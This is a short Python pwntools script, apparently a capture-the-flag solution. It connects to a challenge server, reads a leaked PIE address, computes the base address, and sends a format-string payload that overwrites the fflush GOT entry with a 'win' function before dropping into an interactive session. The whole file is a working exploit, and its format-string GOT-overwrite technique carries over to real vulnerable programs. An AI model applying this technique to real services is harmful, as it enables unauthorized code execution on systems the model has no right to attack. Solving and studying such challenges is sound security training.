from re import M
from pwn import *
from formatstring import *

if __name__=="__main__":
    #io = process('./chall')
    io = remote('gc1.eng.run', 30417)
    io.recvuntil('Take this before you go: ')
    main_pie_addr = int(io.recvline(),0)
    got_offset = 0x3520
    fflush_offset = 0x3568
    main_offset = 0x12c7
    win_offset = 0x125f

    base = main_pie_addr - main_offset
    got = got_offset + base
    fflush = fflush_offset + base
    win = win_offset + base

    settings = PayloadSettings(offset=6, arch=x86_64)
    p = WritePayload()
    p[fflush] = p64(win)
    payload = p.generate(settings)

    print(payload)
    io.sendline(payload)

    io.interactive()